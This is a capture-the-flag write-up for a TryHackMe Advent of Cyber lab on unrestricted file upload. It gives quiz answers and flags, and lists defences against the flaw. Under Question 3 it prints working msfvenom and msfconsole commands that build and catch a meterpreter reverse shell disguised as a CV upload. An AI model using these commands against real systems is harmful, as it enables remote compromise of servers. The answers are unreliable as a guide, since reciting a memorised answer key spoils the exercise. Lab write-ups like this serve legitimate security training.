# Advent of Cyber 4 - Day 15

Link: [Advent Of Cyber 4 on TryHackMe](https://tryhackme.com/room/adventofcyber4)

### Question 1

> What is the name given to file uploads that allow threat actors to upload any files that they want?

Answer: `Unrestricted`

### Question 2

> What is the title of the web application developed by Santa's freelancer?

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day15/2.png?raw=true)

Answer: `SantaSideKick2`

### Question 3

> What is the value of the flag stored in the HR Elf's Documents directory?

We start by using `msfvenom` to create a malicious executable: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT="4321" -f exe -o cv-maya.exe`

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day15/3.1.png?raw=true)

We then tell the shell to create a reverse shell handler, with automatic meterpreter elevation:

`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT '4231'; exploit"`

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day15/3.2.png?raw=true)

We then upload our "CV" to the platform:

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day15/3.3.png?raw=true)

The "CV" gets executed, leading us to a meterpreter session:

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day15/3.4.png?raw=true)

We situate ourselves and then navigate to the target directory to get the flag:

![](https://github.com/AtomicMaya/knowledge-base/blob/main/writeup_resources/aoc4/day15/3.5.png?raw=true)

Answer: `THM{Naughty.File.Uploads.Can.Get.You.RCE}`

### Question 4

> What defence technique can be implemented to ensure that specific file types can be uploaded?

Answer: `File Extension Validation`

### Question 5

> What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?

Answer: `File Renaming`

### Question 6

> What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?

Answer: `Malware Scanning`